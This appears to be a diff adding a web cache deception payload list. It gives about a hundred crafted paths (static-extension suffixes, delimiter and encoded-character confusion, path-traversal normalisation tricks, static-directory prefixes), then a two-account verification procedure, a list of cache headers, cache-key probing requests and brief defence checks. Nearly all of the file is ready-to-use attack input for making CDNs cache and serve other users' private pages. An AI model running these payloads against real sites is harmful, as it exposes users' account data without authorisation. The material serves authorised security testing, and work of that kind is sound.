@@ -1,0 +1,137 @@
+# Web Cache Deception Payloads
+# Make a cache store a dynamic, user-specific response as static content so another request can read it. Use two test accounts; never fetch another real user's data.
+
+# Static-extension suffix on a dynamic path (origin ignores the suffix; cache keys on extension)
+/account/settings/x.css
+/account/settings/x.js
+/account/settings/x.png
+/account/settings/x.jpg
+/account/settings/x.ico
+/account/settings/x.svg
+/account/settings/x.woff
+/account/settings/x.json
+/account/settings/x.txt
+/account/settings/x.pdf
+/account/settings/x.gif
+/account/settings/x.map
+/account/settings/x.avif
+/account/settings/x.webp
+/account/settings/robots.txt
+/account/settings/favicon.ico
+/account/settings/index.css
+/account.css
+/account.js
+/account.png
+/api/me/x.css
+/api/me.css
+/api/user/profile/x.js
+/profile/x.css
+
+# Path parameter / delimiter confusion (origin treats the delimiter as the end of the route; cache does not)
+/account/settings;x.css
+/account/settings;.css
+/account/settings;/x.css
+/account/settings%3Bx.css
+/account/settings.css
+/account/settings%00x.css
+/account/settings%0ax.css
+/account/settings%0dx.css
+/account/settings%09x.css
+/account/settings%20x.css
+/account/settings%23x.css
+/account/settings%3Fx.css
+/account/settings?x.css
+/account/settings#x.css
+/account/settings,x.css
+/account/settings:x.css
+/account/settings!x.css
+/account/settings@x.css
+/account/settings$x.css
+/account/settings&x.css
+/account/settings'x.css
+/account/settings*x.css
+/account/settings+x.css
+/account/settings=x.css
+/account/settings|x.css
+/account/settings~x.css
+/account/settings%7Cx.css
+/account/settings%2Fx.css
+
+# Normalisation discrepancies (cache normalises path before keying, origin does not, or the reverse)
+/static/..%2faccount/settings
+/static/..%2Faccount/settings
+/static/%2e%2e/account/settings
+/static/%2e%2e%2faccount/settings
+/static/..;/account/settings
+/static/../account/settings
+/static/.%2e/account/settings
+/static%2f..%2faccount/settings
+/assets/..%2faccount/settings
+/resources/..%2faccount/settings
+/images/..%2faccount/settings
+/account/settings/..%2fx.css
+/account/settings%2f%2e%2e%2fx.css
+/account/settings/%2e%2e%2fstatic/x.css
+/account/settings/..%2fstatic/x.css
+/static/..%5caccount/settings
+/static/%252e%252e/account/settings
+/static/%c0%ae%c0%ae/account/settings
+
+# Static directory prefix (cache rule matches /static/, /assets/, /images/ and similar)
+/assets/../account/settings
+/images/../account/settings
+/js/../account/settings
+/css/../account/settings
+/public/../account/settings
+/media/../account/settings
+/resources/../account/settings
+/wp-content/../account/settings
+
+# Well-known cached files (exact-name cache rules: robots.txt, favicon.ico, index.html)
+/account/settings/index.html
+/robots.txt/../account/settings
+/robots.txt%2f..%2faccount/settings
+/favicon.ico/../account/settings
+/index.html/../account/settings
+/robots.txt;/account/settings
+
+# Verification sequence (use two test accounts, A and B, and a unique cache-busting segment)
+# 1. As account A (authenticated): GET /account/settings/x-<unique-token>.css
+# 2. As account B or unauthenticated: GET the same URL
+# 3. Vulnerable if the response contains account A's data and a cache header such as X-Cache: HIT, Age: >0 or CF-Cache-Status: HIT
+
+# Cache headers to read in the responses
+X-Cache: HIT
+X-Cache: MISS
+Age: 10
+CF-Cache-Status: HIT
+CF-Cache-Status: DYNAMIC
+X-Cache-Status: HIT
+X-Served-By:
+X-Varnish:
+Via: 1.1 varnish
+X-Cache-Hits:
+Cache-Control: public, max-age=3600
+Cache-Control: no-cache
+Vary: Cookie
+Expires:
+Surrogate-Control:
+CDN-Cache-Control:
+X-Akamai-Cache:
+X-Amz-Cf-Pop:
+Server-Timing: cdn-cache; desc=HIT
+
+# Cache key probing (find what the cache keys on)
+GET /?cb=cache-marker-1 HTTP/1.1
+GET /?cb=cache-marker-1&utm_source=x HTTP/1.1
+GET /?cb=cache-marker-1#fragment HTTP/1.1
+GET /?CB=cache-marker-1 HTTP/1.1
+GET //?cb=cache-marker-1 HTTP/1.1
+GET /./?cb=cache-marker-1 HTTP/1.1
+GET /?cb=cache-marker-1&cb=cache-marker-2 HTTP/1.1
+GET /?cb=cache-marker-1;x=y HTTP/1.1
+
+# Defence checks (what a fixed deployment returns)
+# Dynamic routes should answer 404 for unknown suffixes
+# Cache-Control: no-store on authenticated responses
+# CDN rules keyed on Content-Type, not on URL extension
